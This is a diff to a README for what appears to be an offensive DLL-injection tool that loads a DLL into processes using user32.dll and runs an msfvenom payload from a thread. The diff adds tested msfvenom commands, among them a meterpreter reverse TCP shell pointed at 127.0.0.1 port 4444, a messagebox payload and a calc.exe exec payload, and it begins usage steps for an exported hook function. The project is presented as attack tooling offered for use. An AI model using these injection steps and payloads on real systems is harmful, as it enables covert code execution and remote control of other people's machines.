@@ -3,7 +3,8 @@ main.cpp: Loads test.dll into a subset of processes that have user32.dll loaded 
 dllmain.cpp: Launches a thread that launches an msfvenom payload whenever it is imported into a process </br>
 ## Payloads that have been tested with this project
 `msfvenom -f c -p windows/x64/messagebox EXITFUNC=thread TEXT="Hello, from urmom"` </br>
-`msfvenom -p windows/x64/meterpreter_reverse_tcp EXITFUNC=thread RHOST=127.0.0.1 RPORT=4444 -f c -o file.txt`
+`msfvenom -f c -p windows/x64/meterpreter_reverse_tcp EXITFUNC=thread RHOST=127.0.0.1 RPORT=4444  -o file.txt` </br>
+`msfvenom -f c -p windows/x64/exec CMD=calc.exe EXITFUNC=thread`
 ## Usage
 1. Just add this to your dll:
 extern "C" __declspec(dllexport) int NextHook(int code, WPARAM wParam, LPARAM lParam) {
